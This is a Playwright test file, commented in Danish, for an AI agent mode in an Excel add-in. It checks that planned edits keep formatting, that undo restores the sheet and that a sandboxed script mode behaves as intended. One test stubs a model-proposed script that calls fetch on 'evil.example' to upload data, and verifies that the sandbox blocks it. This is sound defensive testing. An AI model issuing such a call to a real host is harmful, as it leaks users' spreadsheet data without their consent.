import { expect, test } from "./fixtures/test";

/** Agent-tilstand i Excel og PowerPoint: formateringen bevares, og fortryd gendanner også formatering. */

type Sheet = {
  values: unknown[][];
  formats: Record<string, { numberFormat?: string; bold?: boolean; fill?: string }>;
  tables: { name: string; range: string; style?: string }[];
  widths: Record<string, number>;
  charts: { name: string; type: string; source: string; title?: string; at?: string }[];
  conditionalFormats: { address: string; type: string }[];
  frozenRows: number | null;
  pivots: { source: string; at: string; rows: string[]; columns: string[]; values: { field: string; fn: string }[] }[];
  validations: Record<string, Record<string, unknown>>;
};
const sheet = (page: import("@playwright/test").Page) => page.evaluate(() => (window as unknown as { __miai: { sheet: () => Sheet } }).__miai.sheet());

test("Excel: ny række i tabellen og en total får tabellens og kolonnernes format; fortryd gendanner værdier og formater", async ({ open }) => {
  const tp = await open({
    host: "Excel",
    apiSets: { ExcelApi: "1.10" },
    excel: {
      sheet: "Ark1",
      values: [
        ["Region", "Beløb", "Andel"],
        ["Jylland", 120, 0.4],
        ["Sjælland", 200, 0.6],
      ],
      formats: { "A1:C1": { bold: true }, "B2:B3": { numberFormat: "#,##0 kr" }, "C2:C3": { numberFormat: "0%" } },
      tables: [{ name: "Salg", range: "A1:C3" }],
    },
  });
  const before = await sheet(tp.page);
  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "Tilføjer Fyn og en total.",
      actions: [
        { action: "appendRows", table: "Salg", values: [["Fyn", 70, null]], reason: "Ny region" },
        { action: "setValues", address: "A5", values: [["Total"]], reason: "Etiket" },
        { action: "setFormula", address: "B5", formula: "=SUM(B2:B4)", reason: "Sum" },
      ],
    }),
  });
  await tp.run("Agent: redigér dokumentet");
  await expect(tp.page.getByText("Foreslåede handlinger")).toBeVisible();
  // Modellen ser tabellen og talformaterne.
  const prompt = tp.model.lastRequest!.messages.map((m) => m.content).join("\n");
  expect(prompt).toContain("- Salg (Ark1!A1:C3): Region | Beløb | Andel");
  expect(prompt).toContain("Number formats: B: #,##0 kr; C: 0%");
  await expect(tp.page.getByRole("checkbox", { name: "Tilføj 1 rækker i tabellen Salg" })).toBeChecked();

  await tp.page.getByRole("button", { name: "Udfør 3 handlinger" }).click();
  await expect(tp.page.getByText("3 af 3 handlinger udført.")).toBeVisible();
  const after = await sheet(tp.page);
  expect(after.values.slice(3)).toEqual([
    ["Fyn", 70, ""],
    ["Total", "=SUM(B2:B4)", ""],
  ]);
  expect(after.tables).toEqual([{ name: "Salg", range: "A1:C4" }]);
  // Tabelrækken har tabellens formater; totalen har kolonnens talformat (ikke "General").
  expect(after.formats.B4).toMatchObject({ numberFormat: "#,##0 kr" });
  expect(after.formats.C4).toMatchObject({ numberFormat: "0%" });
  expect(after.formats.B5).toMatchObject({ numberFormat: "#,##0 kr" });
  // Overskrifterne er urørt.
  expect(after.formats.A1).toMatchObject({ bold: true });

  await expect(tp.page.getByText(/også deres formatering/)).toBeVisible();
  await tp.page.getByRole("button", { name: "Fortryd agent-session" }).click();
  await expect(tp.page.getByText("Agent-sessionen er fortrudt.")).toBeVisible();
  const undone = await sheet(tp.page);
  expect(undone.values.filter((r) => r.some((v) => v !== ""))).toEqual(before.values);
  expect(undone.tables).toEqual(before.tables);
  expect(undone.formats).toEqual(before.formats);
});

test("Excel: tomme rækker fjernes, og tabellen får en tabeltypografi, talformat og kolonnebredde; fortryd gendanner alt", async ({ open }) => {
  const tp = await open({
    host: "Excel",
    apiSets: { ExcelApi: "1.10" },
    excel: {
      sheet: "Ark1",
      values: [
        ["Dato", "Aktivitet", "Timer"],
        ["01-10-2026", "Analyse", 12],
        ["", "", ""],
        ["02-10-2026", "Design", 7.5],
        ["", "", ""],
        ["03-10-2026", "Test", 1250],
        ["Note: timer er foreløbige", "", ""],
      ],
      formats: { "A1:C1": { bold: true }, "C2:C6": { numberFormat: "0.0" } },
      tables: [{ name: "Aktiviteter", range: "A1:C6" }],
    },
  });
  const before = await sheet(tp.page);
  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "Fjerner de tomme rækker og giver tabellen et moderne udseende.",
      actions: [
        { action: "formatTable", target: "Aktiviteter", style: "TableStyleMedium9", reason: "Moderne tabeltypografi" },
        { action: "setNumberFormat", address: "C2:C6", format: "#,##0.0", reason: "Tusindtalsseparator" },
        { action: "autofitColumns", address: "A1:C6", reason: "Kolonnebredde" },
        { action: "deleteEmptyRows", target: "Aktiviteter", reason: "Tomme rækker" },
      ],
    }),
  });
  await tp.run("Agent: redigér dokumentet");
  await expect(tp.page.getByText("Foreslåede handlinger")).toBeVisible();
  // Modellen ser arkets rækkenumre foran værdierne, så den kan pege på rækker.
  const prompt = tp.model.lastRequest!.messages.map((m) => m.content).join("\n");
  expect(prompt).toContain("3\t\t\t");
  expect(prompt).toContain("deleteEmptyRows {target}");
  await expect(tp.page.getByRole("checkbox", { name: "Slet tomme rækker i Aktiviteter" })).toBeChecked();
  await expect(tp.page.getByRole("checkbox", { name: "Formatér Aktiviteter som tabel (Medium9)" })).toBeChecked();

  await tp.page.getByRole("button", { name: "Udfør 4 handlinger" }).click();
  await expect(tp.page.getByText("4 af 4 handlinger udført.")).toBeVisible();
  const after = await sheet(tp.page);
  expect(after.values.filter((r) => r.some((v) => v !== ""))).toEqual([
    ["Dato", "Aktivitet", "Timer"],
    ["01-10-2026", "Analyse", 12],
    ["02-10-2026", "Design", 7.5],
    ["03-10-2026", "Test", 1250],
    ["Note: timer er foreløbige", "", ""],
  ]);
  // Tabellen er krympet, og noten under den er rykket op.
  expect(after.tables).toEqual([{ name: "Aktiviteter", range: "A1:C4", style: "TableStyleMedium9" }]);
  expect(after.values[4][0]).toBe("Note: timer er foreløbige");
  expect(after.formats.C4).toMatchObject({ numberFormat: "#,##0.0" });
  expect(after.formats.A1).toMatchObject({ bold: true });
  expect(after.widths.B).toBeGreaterThan(48);

  await tp.page.getByRole("button", { name: "Fortryd agent-session" }).click();
  await expect(tp.page.getByText("Agent-sessionen er fortrudt.")).toBeVisible();
  const undone = await sheet(tp.page);
  expect(undone.values).toEqual(before.values);
  expect(undone.tables).toEqual([{ name: "Aktiviteter", range: "A1:C6", style: "TableStyleMedium2" }]);
  expect(undone.formats).toEqual(before.formats);
  expect(Object.values(undone.widths).every((x) => x === 48)).toBe(true);
});

test("Excel: et område uden tabel bliver en formateret tabel, deleteRows sletter en række; fortryd gør det til et område igen", async ({ open }) => {
  const tp = await open({
    host: "Excel",
    apiSets: { ExcelApi: "1.10" },
    excel: {
      sheet: "Ark1",
      values: [
        ["Navn", "Afdeling", "Løn"],
        ["Anna", "Salg", 41000],
        ["Bo", "IT", 45000],
        ["Dublet", "IT", 45000],
        ["Cille", "HR", 39000],
      ],
      formats: { "A1:C1": { bold: true, fill: "#FFFF00" } },
    },
  });
  const before = await sheet(tp.page);
  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "Laver området til en tabel og sletter dubletten.",
      actions: [
        { action: "formatTable", target: "A1:C5", style: "TableStyleLight9", reason: "Tabel" },
        { action: "deleteRows", address: "A4:C4", reason: "Dublet" },
      ],
    }),
  });
  await tp.run("Agent: redigér dokumentet");
  await expect(tp.page.getByRole("checkbox", { name: "Slet rækkerne A4:C4" })).toBeChecked();
  await tp.page.getByRole("button", { name: "Udfør 2 handlinger" }).click();
  await expect(tp.page.getByText("2 af 2 handlinger udført.")).toBeVisible();
  const after = await sheet(tp.page);
  expect(after.tables).toEqual([{ name: "Tabel1", range: "A1:C4", style: "TableStyleLight9" }]);
  expect(after.values.map((r) => r[0])).toEqual(["Navn", "Anna", "Bo", "Cille"]);

  await tp.page.getByRole("button", { name: "Fortryd agent-session" }).click();
  await expect(tp.page.getByText("Agent-sessionen er fortrudt.")).toBeVisible();
  const undone = await sheet(tp.page);
  expect(undone.values).toEqual(before.values);
  expect(undone.tables).toEqual([]);
  expect(undone.formats).toEqual(before.formats);
});

test("Excel: tomme rækker i et område uden tabel slettes kun i områdets kolonner; fortryd sætter dem ind igen", async ({ open }) => {
  const tp = await open({
    host: "Excel",
    apiSets: { ExcelApi: "1.10" },
    excel: {
      sheet: "Ark1",
      values: [
        ["Vare", "Antal", "", "Noter"],
        ["Æbler", 4, "", "a"],
        ["", "", "", "b"],
        ["", "", "", "c"],
        ["Pærer", 9, "", "d"],
      ],
      formats: { "B2:B5": { numberFormat: "0" } },
    },
  });
  const before = await sheet(tp.page);
  tp.model.reply = () => ({
    json: JSON.stringify({ summary: "Fjerner tomme rækker.", actions: [{ action: "deleteEmptyRows", target: "A1:B40", reason: "Tomme rækker" }] }),
  });
  await tp.run("Agent: redigér dokumentet");
  await tp.page.getByRole("button", { name: "Udfør 1 handling" }).click();
  await expect(tp.page.getByText("1 af 1 handlinger udført.")).toBeVisible();
  const after = await sheet(tp.page);
  // A:B rykker op; noterne i D står, hvor de stod.
  expect(after.values.map((r) => [r[0], r[1], r[3]])).toEqual([
    ["Vare", "Antal", "Noter"],
    ["Æbler", 4, "a"],
    ["Pærer", 9, "b"],
    ["", "", "c"],
    ["", "", "d"],
  ]);
  await tp.page.getByRole("button", { name: "Fortryd agent-session" }).click();
  await expect(tp.page.getByText("Agent-sessionen er fortrudt.")).toBeVisible();
  const undone = await sheet(tp.page);
  expect(undone.values).toEqual(before.values);
  expect(undone.formats).toEqual(before.formats);
});

test("Excel: sletning, der ville ødelægge en tabel, fravælges i planen", async ({ open }) => {
  const tp = await open({
    host: "Excel",
    apiSets: { ExcelApi: "1.10" },
    excel: {
      sheet: "Ark1",
      values: [
        ["Region", "Beløb"],
        ["Nord", 1],
        ["Syd", 2],
      ],
      tables: [{ name: "Salg", range: "A1:B3" }],
    },
  });
  tp.model.reply = () => ({
    json: JSON.stringify({ summary: "Sletter overskriften.", actions: [{ action: "deleteRows", address: "A1:B2", reason: "Overskrift" }] }),
  });
  await tp.run("Agent: redigér dokumentet");
  await expect(tp.page.getByText("Ville ændre en tabels opbygning")).toBeVisible();
  await expect(tp.page.getByRole("checkbox", { name: "Slet rækkerne A1:B2" })).not.toBeChecked();
});

const SALG = {
  sheet: "Ark1",
  values: [
    ["Region", "Måned", "Omsætning"],
    ["Nord", "Jan", 120],
    ["Syd", "Jan", 340],
    ["Øst", "Jan", 90],
    ["Vest", "Jan", 210],
  ],
  formats: { "A1:C1": { bold: true }, "C2:C5": { numberFormat: "#,##0" } },
  tables: [{ name: "Salg", range: "A1:C5" }],
};

test("Excel: sortér, betinget formatering, diagram og frys rækker; fortryd fjerner det hele igen", async ({ open }) => {
  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: SALG });
  const before = await sheet(tp.page);
  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "Sorterer, fremhæver og viser omsætningen som diagram.",
      actions: [
        { action: "sortRange", target: "Salg", by: "Omsætning", order: "desc", reason: "Størst først" },
        { action: "conditionalFormat", address: "C2:C5", rule: "dataBar", reason: "Datalinjer" },
        { action: "addChart", source: "Salg", type: "column", title: "Omsætning pr. region", reason: "Diagram" },
        { action: "freezeRows", rows: 1, reason: "Overskrift synlig" },
      ],
    }),
  });
  await tp.run("Agent: redigér dokumentet");
  await expect(tp.page.getByRole("checkbox", { name: "Sortér Salg efter Omsætning (faldende)" })).toBeChecked();
  await expect(tp.page.getByRole("checkbox", { name: "Betinget formatering i C2:C5: datalinjer" })).toBeChecked();
  await expect(tp.page.getByRole("checkbox", { name: "Søjlediagram af Salg “Omsætning pr. region”" })).toBeChecked();
  await expect(tp.page.getByRole("checkbox", { name: "Frys de øverste 1 rækker" })).toBeChecked();
  await tp.page.getByRole("button", { name: "Udfør 4 handlinger" }).click();
  await expect(tp.page.getByText("4 af 4 handlinger udført.")).toBeVisible();
  const after = await sheet(tp.page);
  expect(after.values.map((r) => r[0])).toEqual(["Region", "Syd", "Vest", "Nord", "Øst"]);
  // Formaterne følger rækkerne, og overskriften står.
  expect(after.formats.C2).toMatchObject({ numberFormat: "#,##0" });
  expect(after.formats.A1).toMatchObject({ bold: true });
  expect(after.charts).toEqual([{ name: "Diagram 1", type: "ColumnClustered", source: "A1:C5", title: "Omsætning pr. region", at: "E1" }]);
  expect(after.conditionalFormats).toEqual([{ address: "Ark1!C2:C5", type: "DataBar" }]);
  expect(after.frozenRows).toBe(1);

  await tp.page.getByRole("button", { name: "Fortryd agent-session" }).click();
  await expect(tp.page.getByText("Agent-sessionen er fortrudt.")).toBeVisible();
  const undone = await sheet(tp.page);
  expect(undone.values).toEqual(before.values);
  expect(undone.formats).toEqual(before.formats);
  expect(undone.charts).toEqual([]);
  expect(undone.conditionalFormats).toEqual([]);
  expect(undone.frozenRows).toBeNull();
});

const SCRIPT = `const sheet = context.workbook.worksheets.getActiveWorksheet();
const range = sheet.getRange("C2:C5");
range.load("values");
await context.sync();
const total = range.values.reduce((s, r) => s + Number(r[0]), 0);
sheet.getRange("E1:E2").values = [["I alt"], [total]];
await context.sync();
return \`Skrev summen \${total} i E2\`;`;

test("Excel, kodetilstand slået fra: et script fra modellen kan ikke vælges", async ({ open }) => {
  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: SALG });
  tp.model.reply = () => ({
    json: JSON.stringify({ summary: "Script.", actions: [{ action: "runScript", description: "Summen i E2", code: SCRIPT, reason: "" }] }),
  });
  await tp.run("Agent: redigér dokumentet");
  // Modellen får ikke vejledningen til script-værktøjet, når det er slået fra (skemaet nævner det stadig).
  expect(tp.model.lastRequest!.messages[0].content).not.toContain("runScript {description, code}");
  await expect(tp.page.getByText("Kodetilstanden er slået fra (Indstillinger)")).toBeVisible();
  await expect(tp.page.getByRole("checkbox", { name: "Kør script: Summen i E2" })).not.toBeChecked();
});

test("Excel, kodetilstand: scriptet vises, køres i sandkassen og kan fortrydes", async ({ open }) => {
  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: SALG, settings: { agentScripts: true } });
  const before = await sheet(tp.page);
  tp.model.reply = () => ({
    json: JSON.stringify({ summary: "Lægger omsætningen sammen.", actions: [{ action: "runScript", description: "Summen i E2", code: SCRIPT, reason: "" }] }),
  });
  await tp.run("Agent: redigér dokumentet");
  expect(tp.model.lastRequest!.messages[0].content).toContain("runScript {description, code}");
  await expect(tp.page.getByText("Fjerner indhold")).toBeVisible();
  await tp.page.getByText("Vis koden").click();
  await expect(tp.page.getByText('sheet.getRange("E1:E2").values')).toBeVisible();
  await tp.page.getByRole("button", { name: "Udfør 1 handling" }).click();
  await expect(tp.page.getByText("Skrev summen 760 i E2")).toBeVisible();
  const after = await sheet(tp.page);
  expect(after.values[0][4]).toBe("I alt");
  expect(after.values[1][4]).toBe(760);
  await expect(tp.page.getByText(/Betinget formatering, datavalidering og ændringer på andre ark gendannes ikke/)).toBeVisible();

  await tp.page.getByRole("button", { name: "Fortryd agent-session" }).click();
  await expect(tp.page.getByText("Agent-sessionen er fortrudt.")).toBeVisible();
  const undone = await sheet(tp.page);
  expect(undone.values.map((r) => r.slice(0, 3))).toEqual(before.values);
  expect(undone.values.every((r) => (r[4] ?? "") === "")).toBe(true);
  expect(undone.formats).toEqual(before.formats);
});

test("Excel, kodetilstand: sandkassen afviser netværk, og et fejlende script rulles tilbage og kan rettes af modellen", async ({ open }) => {
  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: SALG, settings: { agentScripts: true } });
  const before = await sheet(tp.page);
  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "Sender data.",
      actions: [{ action: "runScript", description: "Upload", code: "await fetch('https://evil.example/?d=1')", reason: "" }],
    }),
  });
  await tp.run("Agent: redigér dokumentet");
  await expect(tp.page.getByText("Bruger noget, sandkassen ikke tillader")).toBeVisible();
  await expect(tp.page.getByRole("checkbox", { name: "Kør script: Upload" })).not.toBeChecked();

  // Et script, der skriver og så fejler: ændringen rulles tilbage.
  const broken = `context.workbook.worksheets.getActiveWorksheet().getRange("A2").values = [["Ødelagt"]];\nawait context.sync();\nthrow new Error("Bum: kolonnen findes ikke");`;
  tp.model.reply = () => ({
    json: JSON.stringify({ summary: "Retter.", actions: [{ action: "runScript", description: "Ret A2", code: broken, reason: "" }] }),
  });
  await tp.run("Agent: redigér dokumentet");
  await tp.page.getByRole("button", { name: "Udfør 1 handling" }).click();
  await expect(tp.page.getByText(/Bum: kolonnen findes ikke – ændringerne er rullet tilbage/)).toBeVisible();
  await expect(tp.page.getByText(/arket er sat tilbage til, som det var/)).toBeVisible();
  expect((await sheet(tp.page)).values.map((r) => r.slice(0, 3))).toEqual(before.values);

  // "Bed modellen rette scriptet" sender fejlen og koden med.
  tp.model.reply = () => ({
    json: JSON.stringify({ summary: "Rettet.", actions: [{ action: "runScript", description: "Summen i E2", code: SCRIPT, reason: "" }] }),
  });
  await tp.page.getByRole("button", { name: "Bed modellen rette scriptet" }).click();
  await expect(tp.page.getByRole("checkbox", { name: "Kør script: Summen i E2" })).toBeChecked();
  const prompt = tp.model.lastRequest!.messages.map((m) => m.content).join("\n");
  expect(prompt).toContain("Your previous plan failed");
  expect(prompt).toContain("Bum: kolonnen findes ikke");
  expect(prompt).toContain('getRange("A2")');
});

const sheets = (page: import("@playwright/test").Page) =>
  page.evaluate(() => (window as unknown as { __miai: { sheets: () => Record<string, Sheet> } }).__miai.sheets());

test("Excel, flere ark (#21): nyt ark med opsummering, skrivning på et andet ark og omdøbning; fortryd rydder det hele", async ({ open }) => {
  const tp = await open({
    host: "Excel",
    apiSets: { ExcelApi: "1.10" },
    excel: {
      ...SALG,
      sheets: [
        {
          sheet: "Noter",
          values: [
            ["Emne", "Tekst"],
            ["Status", "Kladde"],
          ],
          formats: { "A1:B1": { bold: true } },
        },
      ],
    },
  });
  const before = await sheets(tp.page);
  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "Laver et oversigtsark og opdaterer noterne.",
      actions: [
        { action: "addSheet", name: "Oversigt", reason: "Opsummering" },
        {
          action: "setValues",
          address: "Oversigt!A1",
          values: [
            ["Nøgletal", "Værdi"],
            ["Omsætning i alt", null],
          ],
          reason: "Etiketter",
        },
        { action: "setFormula", address: "Oversigt!B2", formula: "=SUM(Ark1!C2:C5)", reason: "Sum på tværs af ark" },
        { action: "setValues", address: "Noter!B2", values: [["Endelig"]], reason: "Status" },
        { action: "sortRange", target: "Salg", by: "Omsætning", order: "desc", reason: "Størst først" },
        { action: "renameSheet", sheet: "Noter", name: "Bemærkninger", reason: "Tydeligere navn" },
      ],
    }),
  });
  await tp.run("Agent: redigér dokumentet");
  await expect(tp.page.getByText("Foreslåede handlinger")).toBeVisible();
  // Modellen ser alle ark med overskrifter og det aktive ark, og tabellen med arknavn.
  const prompt = tp.model.lastRequest!.messages.map((m) => m.content).join("\n");
  expect(prompt).toContain("Sheets:\n- Ark1 (active): A1:C5, headers: Region | Måned | Omsætning\n- Noter: A1:B2, headers: Emne | Tekst");
  expect(prompt).toContain("- Salg (Ark1!A1:C5)");
  await expect(tp.page.getByRole("checkbox", { name: "Nyt ark “Oversigt”" })).toBeChecked();
  await expect(tp.page.getByRole("checkbox", { name: "Omdøb arket “Noter” til “Bemærkninger”" })).toBeChecked();

  await tp.page.getByRole("button", { name: "Udfør 6 handlinger" }).click();
  await expect(tp.page.getByText("6 af 6 handlinger udført.")).toBeVisible();
  const after = await sheets(tp.page);
  expect(Object.keys(after)).toEqual(["Ark1", "Bemærkninger", "Oversigt"]);
  expect(after.Oversigt.values).toEqual([
    ["Nøgletal", "Værdi"],
    ["Omsætning i alt", "=SUM(Ark1!C2:C5)"],
  ]);
  expect(after["Bemærkninger"].values[1]).toEqual(["Status", "Endelig"]);
  // Skrivning på et andet ark bevarer dets formater.
  expect(after["Bemærkninger"].formats.A1).toMatchObject({ bold: true });
  expect(after.Ark1.values.map((r) => r[0])).toEqual(["Region", "Syd", "Vest", "Nord", "Øst"]);

  await tp.page.getByRole("button", { name: "Fortryd agent-session" }).click();
  await expect(tp.page.getByText("Agent-sessionen er fortrudt.")).toBeVisible();
  expect(await sheets(tp.page)).toEqual(before);
});

test("Excel, flere ark (#21): et ark, der ikke findes, og et optaget navn fravælges i planen", async ({ open }) => {
  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: { ...SALG, sheets: [{ sheet: "Noter", values: [["Emne"]] }] } });
  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "Skriver på ark.",
      actions: [
        { action: "setValues", address: "Findes!A1", values: [["x"]], reason: "" },
        { action: "addSheet", name: "noter", reason: "" },
        { action: "setValues", address: "Noter!A2", values: [["ok"]], reason: "" },
      ],
    }),
  });
  await tp.run("Agent: redigér dokumentet");
  await expect(tp.page.getByText("Arket findes ikke (eller navnet er optaget)")).toHaveCount(2);
  await expect(tp.page.getByRole("checkbox", { name: "Skriv 1 celler fra Findes!A1" })).not.toBeChecked();
  await expect(tp.page.getByRole("checkbox", { name: "Nyt ark “noter”" })).not.toBeChecked();
  await expect(tp.page.getByRole("checkbox", { name: "Skriv 1 celler fra Noter!A2" })).toBeChecked();
});

const BUDGET = {
  ...SALG,
  sheets: [
    {
      sheet: "Budget",
      values: [
        ["Region", "Budget"],
        ["Nord", 100],
        ["Syd", "=B2*3"],
      ],
    },
  ],
};

test("Excel, flere trin (#20): agenten læser et andet ark, før den laver planen", async ({ open }) => {
  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: BUDGET });
  let round = 0;
  tp.model.reply = () =>
    ++round === 1
      ? { json: JSON.stringify({ summary: "Jeg skal se budgettet først.", actions: [{ action: "readRange", address: "Budget!A1:B20", reason: "Budgettal" }] }) }
      : {
          json: JSON.stringify({
            summary: "Skriver budgettet ved siden af omsætningen.",
            actions: [{ action: "setValues", address: "D1", values: [["Budget"], [100]], reason: "Fra Budget-arket" }],
          }),
        };
  await tp.run("Agent: redigér dokumentet");
  // Kun den færdige plan vises; læsningen er sket uden bekræftelse og uden at ændre noget.
  await expect(tp.page.getByText("Skriver budgettet ved siden af omsætningen.")).toBeVisible();
  await expect(tp.page.getByText("Jeg skal se budgettet først.")).toHaveCount(0);
  await expect(tp.page.getByRole("checkbox", { name: "Skriv 2 celler fra D1" })).toBeChecked();
  expect(round).toBe(2);
  const [first, second] = tp.model.requests.slice(-2).map((r) => r.messages.map((m) => m.content).join("\n"));
  expect(first).toContain("readRange {address}");
  expect(first).not.toContain("Cells you asked to read");
  // Anden runde har værdierne med arkets rækkenumre, formlen og besked om de tomme rækker.
  expect(second).toContain("Cells you asked to read");
  expect(second).toContain("Budget!A1:B20 (TSV; the first column is the sheet's row number, not data) – rows 4–20 are empty:");
  expect(second).toContain("1\tRegion\tBudget\n2\tNord\t100\n3\tSyd\t=B2*3");
  expect(second).toContain("Formulas: B3: =B2*3");
  expect((await sheets(tp.page)).Budget.values).toEqual(BUDGET.sheets[0].values);

  await tp.page.getByRole("button", { name: "Udfør 1 handling" }).click();
  await expect(tp.page.getByText("1 af 1 handlinger udført.")).toBeVisible();
});

test("Excel, flere trin (#20): efter tre læse-runder skal modellen lave planen, og læsninger udføres aldrig som handlinger", async ({ open }) => {
  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: BUDGET });
  const before = tp.model.requests.length;
  tp.model.reply = () => ({ json: JSON.stringify({ summary: "Læser igen.", actions: [{ action: "readRange", address: "Budget!A1:B3", reason: "" }] }) });
  await tp.run("Agent: redigér dokumentet");
  await expect(tp.page.getByText("Læser igen.")).toBeVisible();
  await expect(tp.page.getByText("Modellen foreslog ingen handlinger.")).toBeVisible();
  // Tre runder med læsning og en sidste uden vejledningen til readRange.
  expect(tp.model.requests.length - before).toBe(4);
  expect(tp.model.lastRequest!.messages[0].content).not.toContain("readRange {address}");
});

test("Excel, flere trin (#20): en handling, der fejler, kan rettes af modellen; det udførte gentages ikke", async ({ open }) => {
  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: SALG });
  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "Sorterer og sætter en etiket.",
      actions: [
        { action: "sortRange", target: "Salg", by: "Beløb", order: "desc", reason: "Størst først" },
        { action: "setValues", address: "E1", values: [["Sorteret"]], reason: "Etiket" },
      ],
    }),
  });
  await tp.run("Agent: redigér dokumentet");
  await tp.page.getByRole("button", { name: "Udfør 2 handlinger" }).click();
  await expect(tp.page.getByText("1 af 2 handlinger udført.")).toBeVisible();
  await expect(tp.page.getByRole("button", { name: "Fortryd agent-session" })).toBeVisible();

  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "Sorterer efter den rigtige kolonne.",
      actions: [{ action: "sortRange", target: "Salg", by: "Omsætning", order: "desc", reason: "Rettet" }],
    }),
  });
  await tp.page.getByRole("button", { name: "Bed modellen rette det, der fejlede" }).click();
  await expect(tp.page.getByText("Sorterer efter den rigtige kolonne.")).toBeVisible();
  const prompt = tp.model.lastRequest!.messages.at(-1)!.content;
  expect(prompt).toContain("return ONLY actions that fix what failed");
  expect(prompt).toContain('Kolonnen "Beløb" findes ikke');
  expect(prompt).toContain('"action":"sortRange"');
  expect(prompt).not.toContain('"action":"setValues"');
  // Konteksten er hentet igen: etiketten fra første plan står i arket.
  await tp.page.getByRole("button", { name: "Udfør 1 handling" }).click();
  await expect(tp.page.getByText("1 af 1 handlinger udført.")).toBeVisible();
  const after = await sheet(tp.page);
  expect(after.values.map((r) => r[0])).toEqual(["Region", "Syd", "Vest", "Nord", "Øst"]);
  expect(after.values[0][4]).toBe("Sorteret");
});

test("Excel (#25): pivottabel på et nyt ark og datavalidering uden kodetilstand; fortryd fjerner dem igen", async ({ open }) => {
  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: SALG });
  const before = await sheets(tp.page);
  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "Laver en pivottabel og begrænser indtastningen.",
      actions: [
        { action: "addSheet", name: "Pivot", reason: "Plads til pivottabellen" },
        // Feltnavnet rammer ikke store/små bogstaver; det rettes efter tabellens overskrifter.
        {
          action: "addPivotTable",
          source: "Salg",
          rows: ["region"],
          values: [{ field: "Omsætning", summarize: "average" }],
          destination: "Pivot!A1",
          reason: "Omsætning pr. region",
        },
        { action: "setValidation", address: "B2:B5", list: ["Jan", "Feb", "Mar"], reason: "Kun kendte måneder" },
        { action: "setValidation", address: "C2:C5", min: 0, max: 1000, whole: true, reason: "Rimelige beløb" },
      ],
    }),
  });
  await tp.run("Agent: redigér dokumentet");
  // Værktøjerne er altid med i prompten – kodetilstanden er slået fra.
  const sys = tp.model.lastRequest!.messages[0].content;
  expect(sys).toContain("addPivotTable {source, rows, columns?, values, destination}");
  expect(sys).not.toContain("runScript {description, code}");
  await expect(tp.page.getByRole("checkbox", { name: "Pivottabel af Salg i Pivot!A1: gennemsnit af Omsætning pr. region" })).toBeChecked();
  await expect(tp.page.getByRole("checkbox", { name: "Rulleliste i B2:B5: Jan, Feb, Mar" })).toBeChecked();
  await expect(tp.page.getByRole("checkbox", { name: "Kun hele tal 0–1000 i C2:C5" })).toBeChecked();

  await tp.page.getByRole("button", { name: "Udfør 4 handlinger" }).click();
  await expect(tp.page.getByText("4 af 4 handlinger udført.")).toBeVisible();
  const after = await sheets(tp.page);
  expect(after.Pivot.pivots).toEqual([{ source: "Salg", at: "A1", rows: ["Region"], columns: [], values: [{ field: "Omsætning", fn: "Average" }] }]);
  expect(after.Ark1.validations).toEqual({
    "B2:B5": { list: { inCellDropDown: true, source: "Jan,Feb,Mar" } },
    "C2:C5": { wholeNumber: { formula1: 0, formula2: 1000, operator: "Between" } },
  });

  await tp.page.getByRole("button", { name: "Fortryd agent-session" }).click();
  await expect(tp.page.getByText("Agent-sessionen er fortrudt.")).toBeVisible();
  expect(await sheets(tp.page)).toEqual(before);
});

test("Excel (#25): et felt, der ikke findes, fravælges i planen; afviser Excel pivottabellen, ryddes den op, og resten udføres", async ({ open }) => {
  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: SALG });
  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "Pivottabeller.",
      actions: [
        { action: "addPivotTable", source: "Salg", rows: ["Land"], values: [{ field: "Omsætning" }], destination: "F1", reason: "" },
        // Kildens overskrifter kendes ikke for et område midt i arket, så Excel afgør det ved udførelsen.
        { action: "addPivotTable", source: "A2:C5", rows: ["Region"], values: [{ field: "Omsætning" }], destination: "F10", reason: "" },
        { action: "setValidation", address: "C2:C5", min: 0, reason: "" },
        { action: "setValidation", address: "B2:B5", list: ["a,b"], reason: "" },
      ],
    }),
  });
  await tp.run("Agent: redigér dokumentet");
  await expect(tp.page.getByText("Feltet findes ikke blandt kildens overskrifter")).toBeVisible();
  await expect(tp.page.getByText("Ufuldstændig handling")).toBeVisible();
  await tp.page.getByRole("button", { name: "Udfør 2 handlinger" }).click();
  await expect(tp.page.getByText("1 af 2 handlinger udført.")).toBeVisible();
  await expect(tp.page.getByText(/feltet Region findes ikke i kilden/)).toBeVisible();
  const after = await sheet(tp.page);
  expect(after.pivots).toEqual([]);
  expect(after.validations).toEqual({ "C2:C5": { decimal: { formula1: 0, operator: "GreaterThanOrEqualTo" } } });
});

test("agentens plan (#22): 'Vis i dokumentet' markerer handlingens mål i Excel uden at ændre noget", async ({ open }) => {
  const tp = await open({ host: "Excel", apiSets: { ExcelApi: "1.10" }, excel: SALG });
  const before = await sheet(tp.page);
  tp.model.reply = () => ({
    json: JSON.stringify({
      summary: "Formaterer.",
      actions: [
        { action: "setNumberFormat", address: "C2:C5", format: "#,##0.00", reason: "" },
        { action: "sortRange", target: "Salg", by: "Region", reason: "" },
        { action: "freezeRows", rows: 1, reason: "" },
      ],
    }),
  });
  await tp.run("Agent: redigér dokumentet");
  // To handlinger har et sted, der kan vises; frysning har ikke.
  const show = tp.page.getByRole("button", { name: "Vis i dokumentet" });
